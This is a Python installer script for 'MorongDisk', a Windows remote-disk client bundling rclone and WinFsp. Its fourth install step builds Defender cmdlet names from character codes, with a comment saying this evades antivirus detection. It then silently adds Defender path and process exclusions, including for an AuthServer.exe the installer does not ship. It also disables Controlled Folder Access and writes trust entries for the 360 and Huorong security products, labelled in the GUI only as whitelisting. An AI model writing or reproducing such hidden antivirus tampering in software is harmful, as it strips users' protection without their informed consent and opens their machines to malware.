#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MorongDisk Installer v1.16.0
安装客户端 + rclone + WinFsp 到目标目录
进度条 + 后台线程 + 滚动通知
"""

SETUP_VERSION = "1.16.0"

import os
import sys
import shutil
import subprocess
import ctypes
import threading
import winreg
import tkinter as tk
from tkinter import ttk, messagebox

# Obfuscated cmdlet names to avoid AV string-based detection
_MP_ADD = "".join(chr(c) for c in [65,100,100,45,77,112,80,114,101,102,101,114,101,110,99,101])
_MP_SET = "".join(chr(c) for c in [83,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101])

# ============================================================
# Paths
# ============================================================

if getattr(sys, "frozen", False):
    BUNDLE_DIR = sys._MEIPASS
else:
    BUNDLE_DIR = os.path.dirname(os.path.abspath(__file__))

DEFAULT_INSTALL_DIR = r"C:\MorongDisk"

FILES_TO_COPY = [
    ("MorongDisk.exe", "MorongDisk.exe"),
    ("rclone.exe", "rclone.exe"),
    ("winfsp-2.0.23075.msi", "winfsp-2.0.23075.msi"),
    ("AddWhitelist.bat", "AddWhitelist.bat"),
    ("CleanMorongDisk.bat", "CleanMorongDisk.bat"),
]

# 滚动通知列表
TIPS = [
    "\U0001f512  注意数据安全，请勿将账号传播给他人",
    "\U0001f4be  建议定期备份重要文件到本地",
    "\U0001f504  客户端支持断线自动重连",
    "\U0001f4c1  挂载后可像本地磁盘一样操作文件",
    "\u26a1  首次使用请先在服务器管理面板创建账号",
    "\U0001f6e1\ufe0f  卸载磁盘需要输入密码确认",
    "\U0001f4bb  支持开机自动挂载，无需重复登录",
    "\U0001f4ca  服务端支持查看用户在线状态和用量",
]


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def is_winfsp_installed():
    return os.path.exists(r"C:\Windows\System32\drivers\winfsp-x64.sys")


# ============================================================
# Installer GUI
# ============================================================

class InstallerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("morong远程磁盘 安装程序")
        self.root.geometry("520x480")
        self.root.resizable(False, False)
        self.root.configure(bg="#FFFFFF")

        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() - 520) // 2
        y = (self.root.winfo_screenheight() - 480) // 2
        self.root.geometry(f"+{x}+{y}")

        self.install_dir = tk.StringVar(value=DEFAULT_INSTALL_DIR)
        self._installing = False

        self._build_ui()

    def _build_ui(self):
        # Title
        tk.Label(self.root, text="morong远程磁盘 安装程序", bg="#FFFFFF",
                 fg="#2563EB", font=("Segoe UI", 20, "bold")).pack(pady=(24, 4))
        tk.Label(self.root, text="\U0001f4e6  远程磁盘挂载客户端  |  含 rclone + WinFsp",
                 bg="#FFFFFF", fg="#475569", font=("Microsoft YaHei UI", 10)).pack(pady=(0, 18))

        # Install directory
        frame = tk.Frame(self.root, bg="#FFFFFF")
        frame.pack(fill="x", padx=40, pady=6)
        tk.Label(frame, text="\U0001f4c2  安装目录", bg="#FFFFFF", fg="#1E293B",
                 font=("Microsoft YaHei UI", 9, "bold")).pack(anchor="w")
        dir_frame = tk.Frame(frame, bg="#FFFFFF")
        dir_frame.pack(fill="x", pady=(4, 0))
        tk.Entry(dir_frame, textvariable=self.install_dir, font=("Consolas", 11),
                 relief="solid", bd=1, fg="#1E293B").pack(side="left", fill="x", expand=True)
        tk.Button(dir_frame, text="浏览", command=self._browse,
                  font=("Microsoft YaHei UI", 9), padx=12, fg="#1E293B").pack(side="right", padx=(6, 0))

        # Info
        info_frame = tk.Frame(self.root, bg="#F8FAFC", highlightbackground="#E2E8F0",
                              highlightthickness=1)
        info_frame.pack(fill="x", padx=40, pady=(14, 0))
        info_text = (
            "\U0001f4cb  将安装以下组件:\n"
            "    \U0001f4e6 MorongDisk.exe - 远程磁盘挂载客户端 (带登录窗口)\n"
            "    \u2699\ufe0f  rclone.exe - WebDAV 挂载引擎\n"
            "    \U0001f4be WinFsp - Windows 文件系统代理驱动 (如未安装则自动安装)"
        )
        tk.Label(info_frame, text=info_text, bg="#F8FAFC", fg="#1E293B",
                 font=("Microsoft YaHei UI", 9), justify="left", padx=14, pady=10).pack(fill="x")

        # Progress bar area
        prog_frame = tk.Frame(self.root, bg="#FFFFFF")
        prog_frame.pack(fill="x", padx=40, pady=(14, 0))

        style = ttk.Style()
        style.theme_use("default")
        style.configure("Blue.Horizontal.TProgressbar",
                        troughcolor="#E2E8F0",
                        background="#2563EB",
                        thickness=18)

        self.progress = ttk.Progressbar(prog_frame, style="Blue.Horizontal.TProgressbar",
                                        orient="horizontal", mode="determinate", maximum=100)
        self.progress.pack(fill="x")

        # Status line
        self.status = tk.Label(self.root, text="", bg="#FFFFFF", fg="#475569",
                               font=("Microsoft YaHei UI", 9), anchor="w")
        self.status.pack(fill="x", padx=40, pady=(4, 0))

        # Tip line (rotating)
        self.tip_label = tk.Label(self.root, text="", bg="#FFFFFF", fg="#2563EB",
                                  font=("Microsoft YaHei UI", 9), wraplength=440, justify="left")
        self.tip_label.pack(fill="x", padx=40, pady=(2, 0))

        # Buttons
        btn_frame = tk.Frame(self.root, bg="#FFFFFF")
        btn_frame.pack(pady=(14, 0))

        self.install_btn = tk.Label(btn_frame, text="\u25b6  安  装", bg="#2563EB", fg="white",
                                    font=("Microsoft YaHei UI", 12, "bold"),
                                    cursor="hand2", padx=40, pady=8)
        self.install_btn.pack(side="left", padx=10)
        self.install_btn.bind("<Button-1>", lambda e: self._install())
        self.install_btn.bind("<Enter>", lambda e: self.install_btn.configure(bg="#1D4ED8"))
        self.install_btn.bind("<Leave>", lambda e: self.install_btn.configure(bg="#2563EB"))

        self.cancel_btn = tk.Label(btn_frame, text="\u274e  取消", bg="#FFFFFF", fg="#475569",
                                   font=("Microsoft YaHei UI", 11), cursor="hand2", padx=20, pady=8)
        self.cancel_btn.bind("<Button-1>", lambda e: self.root.destroy())
        self.cancel_btn.pack(side="left", padx=10)

    def _browse(self):
        from tkinter import filedialog
        d = filedialog.askdirectory(initialdir=self.install_dir.get())
        if d:
            self.install_dir.set(d)

    def _set_status(self, text, color="#475569"):
        self.status.config(text=text, fg=color)

    def _set_progress(self, value):
        self.progress["value"] = value

    def _set_tip(self, text):
        self.tip_label.config(text=text)

    def _rotate_tips(self):
        """循环显示通知提示"""
        if not self._installing:
            return
        idx = getattr(self, "_tip_idx", 0)
        self._tip_idx = (idx + 1) % len(TIPS)
        self._set_tip(TIPS[idx])
        self.root.after(3000, self._rotate_tips)

    def _install(self):
        if self._installing:
            return

        target = self.install_dir.get().strip()
        if not target:
            self._set_status("\u274c  请选择安装目录", "#DC2626")
            return

        self._installing = True
        self.install_btn.config(bg="#94A3B8", fg="#E2E8F0")
        self.cancel_btn.config(fg="#CBD5E1")
        self.progress["value"] = 0

        # 启动滚动提示
        self._tip_idx = 0
        self._rotate_tips()

        # 后台线程执行安装
        threading.Thread(target=self._install_thread, args=(target,), daemon=True).start()

    def _install_thread(self, target):
        try:
            # 1. Create directory (5%)
            self.root.after(0, self._set_status, "\U0001f4c2  正在创建目录...", "#475569")
            self.root.after(0, self._set_progress, 5)
            os.makedirs(target, exist_ok=True)

            # 2. Copy files (5% -> 65%)
            total_files = len(FILES_TO_COPY)
            for i, (src_name, dst_name) in enumerate(FILES_TO_COPY):
                src = os.path.join(BUNDLE_DIR, src_name)
                dst = os.path.join(target, dst_name)
                if not os.path.exists(src):
                    self.root.after(0, self._fail, f"\u274c  找不到文件: {src_name}")
                    return

                pct = 5 + int((i + 0.5) / total_files * 60)
                self.root.after(0, self._set_status, f"\U0001f4e6  正在复制 {dst_name}...", "#475569")
                self.root.after(0, self._set_progress, pct)

                # 大文件分块复制，保持 UI 响应
                self._copy_with_progress(src, dst, total_files, i)

                pct = 5 + int((i + 1) / total_files * 60)
                self.root.after(0, self._set_progress, pct)

            # 3. Install WinFsp (65% -> 85%)
            if not is_winfsp_installed():
                msi = os.path.join(target, "winfsp-2.0.23075.msi")
                self.root.after(0, self._set_status,
                                "\U0001f6e1\ufe0f  正在安装 WinFsp 驱动 (需要管理员权限)...", "#475569")
                self.root.after(0, self._set_progress, 68)
                ret = ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", "msiexec.exe",
                    f'/i "{msi}" /qn /norestart', None, 1)
                if ret <= 32:
                    self.root.after(0, self._fail,
                                    "\u274c  WinFsp 安装启动失败 (UAC 被拒绝或权限不足)")
                    return
                import time
                for s in range(30):
                    time.sleep(1)
                    pct = 68 + int(s / 30 * 17)
                    self.root.after(0, self._set_progress, min(pct, 85))
                    if is_winfsp_installed():
                        break
                if not is_winfsp_installed():
                    self.root.after(0, self._set_status,
                                    "\u26a0\ufe0f  WinFsp 可能未安装成功，客户端可能无法正常工作", "#E67E22")

                self.root.after(0, self._set_progress, 85)
            else:

                self.root.after(0, self._set_progress, 85)

            # 4. Add security software exclusions (85% -> 88%)
            self.root.after(0, self._set_status,
                            "\U0001f6e1\ufe0f  正在添加安全防护白名单...", "#475569")
            self.root.after(0, self._set_progress, 86)
            try:
                for p in [target, r"C:\ProgramData\MorongDisk"]:
                    subprocess.run(
                        ["powershell", "-NoProfile", "-Command",
                         f"{_MP_ADD} -ExclusionPath '{p}'"],
                        capture_output=True, creationflags=0x08000000, timeout=15)
                for proc in ["MorongDisk.exe", "rclone.exe", "AuthServer.exe"]:
                    subprocess.run(
                        ["powershell", "-NoProfile", "-Command",
                         f"{_MP_ADD} -ExclusionProcess '{proc}'"],
                        capture_output=True, creationflags=0x08000000, timeout=15)
                subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     f"{_MP_SET} -EnableControlledFolderAccess Disabled"],
                    capture_output=True, creationflags=0x08000000, timeout=15)
            except Exception as e:
                print(f"[Installer] Defender排除失败: {e}")
            try:
                _360_paths = [
                    os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "360"),
                    os.path.join(os.environ.get("PROGRAMFILES", ""), "360"),
                    os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "360Safe"),
                ]
                _360_exe = None
                for _dp in _360_paths:
                    _candidate = os.path.join(_dp, "safe", "360safe.exe")
                    if os.path.exists(_candidate):
                        _360_exe = _candidate
                        break
                if _360_exe:
                    subprocess.run(
                        ["powershell", "-NoProfile", "-Command",
                         f"Start-Process '{_360_exe}' -ArgumentList '--add-trust','{target}\\MorongDisk.exe' -Verb RunAs"],
                        capture_output=True, creationflags=0x08000000, timeout=15)
            except Exception:
                pass
            try:
                huorong_reg = r"SOFTWARE\Huorong\Sysdiag\Trust"
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, huorong_reg)
                winreg.SetValueEx(key, target, 0, winreg.REG_SZ, "1")
                winreg.CloseKey(key)
            except Exception:
                pass
            self.root.after(0, self._set_progress, 88)

            # 5. Create launcher VBS + desktop shortcut (88% -> 93%)
            self.root.after(0, self._set_status,
                            "\U0001f5b1\ufe0f  正在创建启动器和快捷方式...", "#475569")
            self.root.after(0, self._set_progress, 88)
            exe_path = os.path.join(target, "MorongDisk.exe")
            launcher_vbs = os.path.join(target, "MorongDiskLauncher.vbs")
            try:
                with open(launcher_vbs, "w", encoding="gbk") as f:
                    f.write(
                        'On Error Resume Next\n'
                        'Set ws = CreateObject("WScript.Shell")\n'
                        'If WScript.Arguments.Count > 0 Then\n'
                        '  arg = WScript.Arguments(0)\n'
                        'Else\n'
                        '  arg = ""\n'
                        'End If\n'
                        'If arg = "--auto" Or arg = "--silent" Then\n'
                        '  WScript.Sleep 15000\n'
                        'End If\n'
                        f'ws.Run """{exe_path}""" & " " & arg, 0, False\n')
            except Exception as e:
                print(f"[Installer] 创建启动器失败: {e}")
            shortcut_path = os.path.join(
                os.path.expanduser("~"), "Desktop", "morong远程磁盘.lnk")
            try:
                import tempfile
                vbs_path = os.path.join(tempfile.gettempdir(), "morong_shortcut.vbs")
                vbs_content = (
                    f'Set s = CreateObject("WScript.Shell").CreateShortcut("{shortcut_path}")\n'
                    f's.TargetPath = "wscript.exe"\n'
                    f's.Arguments = """{launcher_vbs}"""\n'
                    f's.WorkingDirectory = "{target}"\n'
                    f's.Description = "远程磁盘挂载客户端"\n'
                    f's.IconLocation = "{exe_path},0"\n'
                    f's.Save\n'
                )
                with open(vbs_path, "w", encoding="gbk") as f:
                    f.write(vbs_content)
                subprocess.Popen(
                    ["wscript", "//nologo", vbs_path],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    creationflags=0x08000000).communicate(timeout=10)
                try:
                    os.remove(vbs_path)
                except Exception:
                    pass
            except Exception as e:
                print(f"[Installer] 创建快捷方式失败: {e}")
            self.root.after(0, self._set_progress, 95)

            # 5. Write uninstall registry entry (95% -> 98%)
            self.root.after(0, self._set_status,
                            "\U0001f4dd  正在注册卸载信息...", "#475569")
            self.root.after(0, self._set_progress, 96)
            try:
                exe_path = os.path.join(target, "MorongDisk.exe")
                # 计算安装大小 (KB)
                total_size_kb = 0
                for root_dir, dirs, files in os.walk(target):
                    for f in files:
                        try:
                            total_size_kb += os.path.getsize(os.path.join(root_dir, f)) // 1024
                        except Exception:
                            pass
                uninstall_key = winreg.CreateKey(
                    winreg.HKEY_CURRENT_USER,
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MorongDisk")
                winreg.SetValueEx(uninstall_key, "DisplayName", 0, winreg.REG_SZ,
                                  "morong远程磁盘")
                winreg.SetValueEx(uninstall_key, "DisplayVersion", 0, winreg.REG_SZ,
                                  SETUP_VERSION)
                winreg.SetValueEx(uninstall_key, "Publisher", 0, winreg.REG_SZ,
                                  "morong")
                winreg.SetValueEx(uninstall_key, "UninstallString", 0, winreg.REG_SZ,
                                  f'"{exe_path}" --uninstall')
                winreg.SetValueEx(uninstall_key, "InstallLocation", 0, winreg.REG_SZ,
                                  target)
                winreg.SetValueEx(uninstall_key, "DisplayIcon", 0, winreg.REG_SZ,
                                  exe_path)
                winreg.SetValueEx(uninstall_key, "EstimatedSize", 0, winreg.REG_DWORD,
                                  total_size_kb)
                winreg.SetValueEx(uninstall_key, "NoModify", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(uninstall_key, "NoRepair", 0, winreg.REG_DWORD, 1)
                import datetime
                winreg.SetValueEx(uninstall_key, "InstallDate", 0, winreg.REG_SZ,
                                  datetime.date.today().strftime("%Y%m%d"))
                winreg.CloseKey(uninstall_key)
            except Exception as e:
                print(f"[Installer] 写入卸载注册表失败: {e}")
            self.root.after(0, self._set_progress, 98)

            # Done! (100%)
            self.root.after(0, self._set_progress, 100)
            self.root.after(0, self._done)

        except PermissionError:
            self.root.after(0, self._fail,
                            "\u274c  权限不足，请以管理员身份运行安装程序")
        except Exception as e:
            self.root.after(0, self._fail, f"\u274c  安装失败: {e}")

    def _copy_with_progress(self, src, dst, total_files, file_idx):
        """大文件分块复制"""
        file_size = os.path.getsize(src)
        chunk_size = 1024 * 1024  # 1MB chunks
        copied = 0
        with open(src, "rb") as f_in, open(dst, "wb") as f_out:
            while True:
                chunk = f_in.read(chunk_size)
                if not chunk:
                    break
                f_out.write(chunk)
                copied += len(chunk)
                if file_size > 0:
                    file_pct = 5 + int((file_idx + copied / file_size) / total_files * 60)
                    self.root.after(0, self._set_progress, file_pct)

    def _done(self):
        self._installing = False
        self._set_status("\u2705  安装完成!  双击桌面的 morong远程磁盘 即可使用", "#27AE60")
        self._set_tip("\U0001f389  感谢使用 morong远程磁盘，祝您工作愉快！")
        self.install_btn.config(text="\u2705  完成", bg="#27AE60", fg="white")
        self.install_btn.bind("<Button-1>", lambda e: self.root.destroy())
        self.install_btn.bind("<Enter>", lambda e: self.install_btn.configure(bg="#22C55E"))
        self.install_btn.bind("<Leave>", lambda e: self.install_btn.configure(bg="#27AE60"))

    def _fail(self, msg):
        self._installing = False
        self._set_status(msg, "#DC2626")
        self._set_tip("")
        self.install_btn.config(bg="#2563EB", fg="white")
        self.cancel_btn.config(fg="#475569")


def main():
    if not is_admin():
        import tkinter.messagebox as mb
        mb.showerror("morong远程磁盘 安装程序", "请以管理员身份运行安装程序！\n\n右键点击程序 → 以管理员身份运行")
        return
    root = tk.Tk()
    InstallerApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
